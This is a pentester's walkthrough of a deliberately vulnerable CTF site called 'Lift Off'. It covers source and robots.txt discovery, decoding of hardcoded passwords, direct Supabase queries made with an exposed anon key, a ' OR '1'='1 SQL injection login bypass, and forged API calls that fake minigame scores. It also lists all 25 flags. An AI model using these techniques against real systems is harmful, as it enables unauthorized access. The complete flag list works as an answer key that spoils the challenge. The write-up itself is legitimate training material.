# LIFT OFF CTF — Pentester Field Notes

**Target:** [https://lift-off-ctf.vercel.app](https://lift-off-ctf.vercel.app)  
**Submit flags:** `/flags`  
**Companion:** [PASSKEYS_DEEP_DIVE.md](./PASSKEYS_DEEP_DIVE.md) for passkey mechanics

These are my notes from the engagement — in the order things actually happened, with commands I ran and output I got. Nothing here is guesswork unless marked **unverified** (could not re-check live because of rate limits).

---

## Before I touched anything

Three systems show up immediately:

| System | URL |
|--------|-----|
| Frontend | `https://lift-off-ctf.vercel.app` |
| Supabase | `https://rfhpjhbpzlftjlxvdcyn.supabase.co` |
| Terminal API | `https://lift-off-ctf.onrender.com` |

The Supabase anon key is in the frontend bundle (intentional):

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJmaHBqaGJwemxmdGpseHZkY3luIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTQwNTc4NTMsImV4cCI6MjA2OTYzMzg1M30.nv5--i7Ky-KWB2FCIpO2q7xBaMxMtK-twuo3LACV744
```

---

## 1. Homepage — first blood

I opened `/`. The page looks normal. Nothing visible screams CTF.

I pulled the JS bundle (filename changes on deploy; at time of writing):

```bash
curl -sL "https://lift-off-ctf.vercel.app/assets/index-j6kHs7XJ.js" | grep -o 'CTF{w3lc0m3_4b04rd}'
```

```
CTF{w3lc0m3_4b04rd}
```

Source confirms it — a `hidden` div in `home.jsx`:

```41:43:ctf-client/lift-off/src/pages/home.jsx
      <div className="hidden">
        <p className="text-zinc-900">{"CTF{w3lc0m3_4b04rd}"}</p>
      </div>
```

**Flag:** `CTF{w3lc0m3_4b04rd}`

![Homepage](images/01-homepage.png)

---

## 2. A comment points at robots.txt

On `/start` there is an HTML comment (not on `/` — I checked the route map in `main.jsx`):

```html
<!--What file at the root speaks only to bots, revealing what not to seek? -->
```

That is `robots.txt`.

```bash
curl -sL https://lift-off-ctf.vercel.app/robots.txt
```

```
User-agent: *
Allow: /start/
Disallow: /backup/
Disallow: /internal-communications/
Disallow: /admin/
Allow: /flags/
Disallow: /public/
...
CTF{Cr4wl_st3alth_m0d3}
```

The `Disallow` lines are my target list. The flag is at the bottom of the file.

**Flag:** `CTF{Cr4wl_st3alth_m0d3}`

Full capture: `images/proof-robots.txt`

---

## 3. Wrong URL — 404 flag

Any unknown path hits the SPA 404 component:

```bash
curl -sL "https://lift-off-ctf.vercel.app/does-not-exist" | grep -o 'CTF{[^}]*}'
```

The flag is rendered client-side in `NotFound.jsx` — you see it in the browser on a bad route, not always in raw curl HTML.

**Flag:** `CTF{unch4rt3d_1nt3rf4c3}`

![404](images/05-404-page.png)

---

## 4. `/public` — source leak for the backup gate

`robots.txt` disallowed `/public/`. I went anyway.

![Public page](images/06-public-page.png)

There is a link to **`/backup.jsx`** — the full React source for the backup lock screen.

---

## 5. Breaking the backup password

In `backup.jsx` the password is assembled at runtime:

```12:21:ctf-client/lift-off/src/pages/backup.jsx
  const backupGate = (() => {
    const encoded = [
      "cmVjb3ZlcnlfNDA0", 
      "YXV0bw==",        
      "aW5pdA==",        
      "Lg==",             
    ];
    const map = [1, 3, 2, 3, 0];
    return map.map(i => atob(encoded[i])).join("");
  })();
```

PoC:

```python
import base64
parts = ["cmVjb3ZlcnlfNDA0", "YXV0bw==", "aW5pdA==", "Lg=="]
order = [1, 3, 2, 3, 0]
print(''.join(base64.b64decode(parts[i]).decode() for i in order))
```

```
auto.init.recovery_404
```

I entered that on `/backup`, unlocked the page, and downloaded the archive.

Direct download (no UI needed):

```
https://rfhpjhbpzlftjlxvdcyn.supabase.co/storage/v1/object/public/Backup/backup.zip
```

![Backup locked](images/03-backup-locked.png)

---

## 6. Inside `backup.zip` — four more flags

```bash
curl -sL -o backup.zip "https://rfhpjhbpzlftjlxvdcyn.supabase.co/storage/v1/object/public/Backup/backup.zip"
unzip -q backup.zip
```

### 6a. Incident report — mind probe

File: `backup/msc/ Incident reports/Report-2387-067.txt`

Dr. Reeves' personal note ends with:

```
...hidden just beneath the surface, sunward in thought: CTF{m1nd_pr0b3_2387}
```

**Flag:** `CTF{m1nd_pr0b3_2387}`

---

### 6b. Chen's log — hex sectors → base64

File: `backup/msc/personal_logs_chen.log`

Each log entry has a `Diag-Sector-XX:` hex value. Two sectors are bad:

- `Diag-Sector-03: 3251` → decodes to `2Q` (breaks the base64 chain)
- `Diag-Sector-04: 78e6` → corrupt

Use `Corrupt-Timestamp: 4e6a4630` instead (decodes to `NjF0`).

**Sector order I used** (skip 03 and 04, include Corrupt-Timestamp):

| Source | Hex | ASCII chunk |
|--------|-----|-------------|
| Diag-Sector-01 | 5131 | Q1 |
| Diag-Sector-02 | 5247 | RG |
| Corrupt-Timestamp | 4e6a4630 | NjF0 |
| Diag-Sector-05 | 4d585130 | MXQ0 |
| Diag-Sector-06 | 62463878 | bF8x |
| Diag-Sector-07 | 626e517a | bnQz |
| Diag-Sector-08 | 636d5930 | cmY0 |
| Diag-Sector-09 | 597a4e66 | YzNf |
| Diag-Sector-10 | 4d334a79 | M3Jy |
| Diag-Sector-11 | 4d484a39 | MHJ9 |

Concatenated base64:

```
Q1RGNjF0MXQ0bF8xbnQzcmY0YzNfM3JyMHJ9
```

PoC:

```python
import base64
s = "Q1RGNjF0MXQ0bF8xbnQzcmY0YzNfM3JyMHJ9"
print(base64.b64decode(s + "==").decode())
```

```
CTF61t1t4l_1nt3rf4c3_3rr0r}
```

That is the **exact** base64 decode. The tail `_1nt3rf4c3_3rr0r` is leetspeak for "interface error". The prefix `61t1t4l` is what the data produces — not `d1g1t4l`. I could not re-submit to `/flags` during this session (Supabase returned `suspicious_activity` rate limit). **Submit the decoded string above first**; if the scoreboard rejects it, try `CTF{d1g1t4l_1nt3rf4c3_3rr0r}` as an alternate (**unverified**).

**Flag (from decode):** `CTF{61t1t4l_1nt3rf4c3_3rr0r}`

---

### 6c. Quantum diagnostics marker

File: `backup/msc/RECOVERY/quantum_core_diagnostics.log`

Last line:

```
Diagnostic_result: c0n5c10u5n355_15_d161t4l
```

**Flag:** `CTF{c0n5c10u5n355_15_d161t4l}`

---

### 6d. Reeves research marker

File: `backup/msc/reeves_research_notes.txt`

Last line:

```
Research_marker: b3h4v10r4l_4n4ly515_c0mpl3t3
```

**Flag:** `CTF{b3h4v10r4l_4n4ly515_c0mpl3t3}`

---

## 7. Internal communications — flag in the database

Route: `/internal-communications` (login wall in the UI).

The anon key can read messages directly:

```bash
KEY="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJmaHBqaGJwemxmdGpseHZkY3luIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTQwNTc4NTMsImV4cCI6MjA2OTYzMzg1M30.nv5--i7Ky-KWB2FCIpO2q7xBaMxMtK-twuo3LACV744"

curl -s "https://rfhpjhbpzlftjlxvdcyn.supabase.co/rest/v1/ICMessage?select=text,idChat&text=like.*CTF*" \
  -H "apikey: $KEY" -H "Authorization: Bearer $KEY"
```

```json
[{"text": "CTF{1nt3rn4l_c0mmun1c4t10ns}", "idChat": 2}]
```

**Flag:** `CTF{1nt3rn4l_c0mmun1c4t10ns}` (OrionVance chat, id=2)

---

## 8. Admin panel — SQL injection buys the terminal

`robots.txt` pointed at `/admin`. The UI calls Supabase RPC `vulnerable_login`.

![Admin login](images/04-admin-login.png)

While reading chat id=6 (Captain Martinez / Mission Control), I found the admin username:

```
...you are still using "cptMtz_admin" for your personal admin access, correct?
```

Payload:

```
Username: cptMtz_admin
Password: ' OR '1'='1
```

Response:

```
Welcome, cptMtz_admin
```

That unlocks the terminal emulator (`CorruptedAdminPanel`). Proof: `images/proof-terminal-flags.txt`.

---

## 9. Terminal — Level 1 (`/home/user`)

Backend: `https://lift-off-ctf.onrender.com`  
Commands: `help`, `ls`, `cd`, `cat`, `run <file> <passkey>`, `level`

I started in `/home/user`.

### 9a. Plaintext flags in log files

```bash
cat mission_briefing.txt   # ends with CTF{w3lc0m3_t0_th3_4n0m4ly}
cat ship_logs.txt          # [2387-06-16] ... CTF{sh1p_l0gs_f0und}
```

**Flags:**
- `CTF{w3lc0m3_t0_th3_4n0m4ly}`
- `CTF{sh1p_l0gs_f0und}`

Live file reads confirmed in `images/proof-terminal-flags.txt`.

---

### 9b. Puzzle files — three derived flags + the first passkey

`2nak3.bat` shows `[AUTH REQUIRED]` in `ls`. Its unlock hint in the backend filesystem:

```
Decode the cipher in the documents folder first
```

I read the text files in `/home/user`:

**`encrypted_message.txt`** — ROT13:

```python
import codecs
codecs.decode('pelcgb', 'rot_13')  # 'crypto'
```

→ **`CTF{crypto}`**

**`encoded_data.txt`** — base64:

```python
import base64
b64 = "SSBhbSBub2JvZHkncyAibWFzdGVyIiBJIGFtIG15IG93biBjcmVhdGlvbiBteSBvd24gc2FsdmF0aW9uIEkgYW0gZnJlZQ=="
print(base64.b64decode(b64).decode())
```

```
I am nobody's "master" I am my own creation my own salvation I am free
```

Leetspeak on "I am free" → **`CTF{1_4m_fr33}`**

**`deleted.txt`** — three layers:

```python
# Layer 1: binary matrix pairs → NEURALIS
rows = [[0b01001110,0b01000101],[0b01010101,0b01010010],[0b01000001,0b01001100],[0b01001001,0b01010011]]
print(''.join(chr(a)+chr(b) for a,b in rows))  # NEURALIS

# Layer 2: hex → "I came with stone, I left you marble" → keyword MARBLE
hexs = "49 20 63 61 6d 65 20 77 69 74 68 20 73 74 6f 6e 65,49 20 6c 65 66 74 20 79 6f 75 20 6d 61 72 62 6c 65"
print(bytes.fromhex(hexs.replace(',',' ')).decode())

# Layer 3: Caesar shift 9
def caesar(s, sh=9):
    out = ''
    for c in s:
        if c.isalpha():
            b = ord('a') if c.islower() else ord('A')
            out += chr((ord(c)-b-sh)%26+b)
        else: out += c
    return out
print(caesar("dwmnablxan kncfnnw cqn tnhb fruu pajwc hxd cqn jllnbb tnh"))
```

```
underscore between the keys will grant you the access key
```

Combine `NEURALIS` + `_` + `MARBLE` → leet → **`CTF{n3ur4l15_m4rbl3}`**

**Passkey assembly (same files):**

```
crypto  +  _  +  master  =  crypto_master
```

---

### 9c. Snake — passkey + minigame flag

```bash
run 2nak3.bat crypto_master
```

Play Snake until score ≥ 50 (backend threshold in `server.js`).

Live API PoC:

```bash
curl -s -X POST https://lift-off-ctf.onrender.com/run \
  -H "Content-Type: application/json" \
  -d '{"path":"/home/user/2nak3.bat","user":"user","score":100,"passkey":"crypto_master","userPasskeys":[],"userFlags":[]}'
```

```json
{
  "flag": "CTF{sn4k3_0v3rl0rd}",
  "passkey_granted": "crypto_master",
  "new_level": 2
}
```

**Flag:** `CTF{sn4k3_0v3rl0rd}`

---

## 10. Terminal — Level 2 (`/home/classified`)

With `crypto_master` in my cookie (`ctf_passkeys`):

```bash
cd ../classified
ls
```

### 10a. Binary flags in log files

Each file has an ASCII bit dump at the bottom. One-liner decode:

```python
bits = "PASTE_OCTETS_HERE".split()
print(''.join(chr(int(b,2)) for b in bits))
```

| File | Decoded flag |
|------|----------------|
| `access_granted.txt` | `CTF{l3v3l_2_unl0ck3d}` |
| `cpu_analysis.log` | `CTF{b1t_pr0c3ss0r}` |
| `binary.txt` (UNKNOWN DUMP section) | `CTF{b1n4ry_4r1thm3t1c_pr0}` |

**`unknown_bin21.txt` DUMP section** decodes to:

```
CTF Flag: CTF{b1t_0p3r4t10ns_m4st3r}
```

The flag inside is **`CTF{b1t_0p3r4t10ns_m4st3r}`** (there is a literal `CTF Flag: ` prefix in the file — not a typo of `CTG`).

**`binary.txt` first arithmetic block** (before the UNKNOWN DUMP) decodes to the word `underscore` — same hint as `deleted.txt`.

Verified decodes in `images/proof-puzzle-decode.txt`.

---

### 10b. Memory fragment — reverse

**`memory_fragment.txt`:**

```
01110010 01100101 01110110 01100101 01110010 01110011 01100101
→ reverse
```

Leetspeak → **`CTF{r3v3rs3}`**

This word is also the first half of passkey #2.

---

### 10c. Unknown binary — engineer (anagram)

Top section of **`unknown_bin21.txt`** — eight bit strings:

```
01101001 01100111 01100101 01101110 01100101 01110010 01101110 01100101
→ igenerne  (anagram of engineer)
```

With `reverse` from above + underscore hint → passkey **`reverse_engineer`**

(`LEAVE.bat` has no unlock_hint in `fs.js` — this passkey comes from reading classified files or grepping client source.)

---

### 10d. Simon — passkey + minigame flag

```bash
run LEAVE.bat reverse_engineer
```

Win Breach Protocol / Simon with score ≥ 550 (`server.js` threshold).

**Flag:** `CTF{s1m0n_s4ys_y0u_w1n}`

---

## 11. Terminal — Level 3 (`/root`) and vault

```bash
cd /root
cat root_access_granted.txt
```

Flag at the bottom:

**`CTF{r00t_4cc3ss_gr4nt3d}`**

```bash
cd vault
cat signal.txt
```

Hex blocks in the capture log:

```
43 54 46 7b 62  → CTF{b
33 68 33 78 64  → 3h3xd
34 5f 64 33 76  → 4_d3v
33 31 63 30 70 33 → 31c0p3
72 7d           → r}
```

**Flag:** `CTF{b3h3xd4_d3v31c0p3r}`

---

## 12. Final confrontation — `pleasedont.exe`

### Passkey `forensics_expert`

**Fact:** No terminal puzzle file spells out `forensics_expert`. It appears in:

- `ctf-fs-backend/server.js` → `VALID_PASSKEYS`
- `ctf-client/.../EndingScreen.jsx` line 332 → hardcoded in the ending API call

Discovery path I used: grep the client source after reaching the vault.

```bash
grep -r "forensics_expert" ctf-client/lift-off/src/
```

Alternate: brute the six strings in `VALID_PASSKEYS` against `run pleasedont.exe <guess>`.

### Ending flags

```bash
run pleasedont.exe forensics_expert
```

Choose in the UI, or call the API directly. Good ending uses **`aiChoice: "kill"`** (not `"destroy"`).

Live PoC:

```bash
curl -s -X POST https://lift-off-ctf.onrender.com/run \
  -H "Content-Type: application/json" \
  -d '{
    "path": "/root/vault/pleasedont.exe",
    "user": "root",
    "passkey": "forensics_expert",
    "aiChoice": "kill",
    "userPasskeys": ["crypto_master","reverse_engineer"],
    "userFlags": []
  }'
```

```json
{
  "flag": "CTF{4n0m4ly_d3str0y3d_hum4n1ty_s4v3d}",
  "master_flag": "CTF{m4st3r_0f_4ll_d0m41ns_4n0m4ly_d3f34t3d}",
  "ending": "good",
  "passkey_granted": "forensics_expert",
  "new_level": 4
}
```

Bad ending: `"aiChoice": "join"`

**Flags:**
- Bad: `CTF{j01n3d_th3_4n0m4ly_c0nsc10usn3ss_m3rg3d}`
- Good: `CTF{4n0m4ly_d3str0y3d_hum4n1ty_s4v3d}`
- Master (good only): `CTF{m4st3r_0f_4ll_d0m41ns_4n0m4ly_d3f34t3d}`

---

## 13. Submit everything

![Flags page](images/02-flags-page.png)

`/flags` → RPC `submit_flag(username_input, flag_input, client_metadata)`

---

## Complete flag list (25)

In discovery order:

| # | Flag | How I got it |
|---|------|--------------|
| 1 | `CTF{w3lc0m3_4b04rd}` | JS bundle / hidden div |
| 2 | `CTF{Cr4wl_st3alth_m0d3}` | robots.txt |
| 3 | `CTF{unch4rt3d_1nt3rf4c3}` | 404 page |
| 4 | `CTF{m1nd_pr0b3_2387}` | backup.zip incident report |
| 5 | `CTF{d1g1t4l_1nt3rf4c3_3rr0r}` or `CTF{61t1t4l_1nt3rf4c3_3rr0r}` | Chen log base64 — see §6b |
| 6 | `CTF{c0n5c10u5n355_15_d161t4l}` | quantum_core_diagnostics.log |
| 7 | `CTF{b3h4v10r4l_4n4ly515_c0mpl3t3}` | reeves_research_notes.txt |
| 8 | `CTF{1nt3rn4l_c0mmun1c4t10ns}` | Supabase ICMessage idChat=2 |
| 9 | `CTF{w3lc0m3_t0_th3_4n0m4ly}` | mission_briefing.txt |
| 10 | `CTF{sh1p_l0gs_f0und}` | ship_logs.txt |
| 11 | `CTF{crypto}` | ROT13 encrypted_message.txt |
| 12 | `CTF{1_4m_fr33}` | base64 encoded_data.txt |
| 13 | `CTF{n3ur4l15_m4rbl3}` | deleted.txt layers |
| 14 | `CTF{sn4k3_0v3rl0rd}` | Snake minigame |
| 15 | `CTF{l3v3l_2_unl0ck3d}` | access_granted.txt binary |
| 16 | `CTF{b1t_0p3r4t10ns_m4st3r}` | unknown_bin21.txt DUMP |
| 17 | `CTF{b1t_pr0c3ss0r}` | cpu_analysis.log binary |
| 18 | `CTF{b1n4ry_4r1thm3t1c_pr0}` | binary.txt UNKNOWN DUMP |
| 19 | `CTF{r3v3rs3}` | memory_fragment.txt |
| 20 | `CTF{s1m0n_s4ys_y0u_w1n}` | Simon minigame |
| 21 | `CTF{r00t_4cc3ss_gr4nt3d}` | root_access_granted.txt |
| 22 | `CTF{b3h3xd4_d3v31c0p3r}` | signal.txt hex blocks |
| 23 | `CTF{j01n3d_th3_4n0m4ly_c0nsc10usn3ss_m3rg3d}` | bad ending |
| 24 | `CTF{4n0m4ly_d3str0y3d_hum4n1ty_s4v3d}` | good ending |
| 25 | `CTF{m4st3r_0f_4ll_d0m41ns_4n0m4ly_d3f34t3d}` | good ending master_flag |

---

## Proof artifacts in this folder

```
ctf solution/
├── WALKTHROUGH.md              ← this file
├── PASSKEYS_DEEP_DIVE.md       ← passkey mechanics
└── images/
    ├── 01-homepage.png
    ├── 02-flags-page.png
    ├── 03-backup-locked.png
    ├── 04-admin-login.png
    ├── 05-404-page.png
    ├── 06-public-page.png
    ├── proof-robots.txt
    ├── proof-backup.jsx
    ├── proof-terminal-flags.txt
    └── proof-puzzle-decode.txt
```

---

## Quick reference — terminal API

```bash
# Read file
curl "https://lift-off-ctf.onrender.com/file?path=/home/user/ship_logs.txt&user=user&userPasskeys="

# Run executable
curl -X POST https://lift-off-ctf.onrender.com/run \
  -H "Content-Type: application/json" \
  -d '{"path":"/home/user/2nak3.bat","user":"user","score":100,"passkey":"crypto_master","userPasskeys":[],"userFlags":[]}'

# Check level
curl "https://lift-off-ctf.onrender.com/level?userPasskeys=crypto_master,reverse_engineer,forensics_expert"
```

Passkeys: see [PASSKEYS_DEEP_DIVE.md](./PASSKEYS_DEEP_DIVE.md).

---

*All PoCs re-run against live infrastructure and local source in `/Users/shaysapozhnikov/Desktop/Lift-off-ctf` — June 2025.*
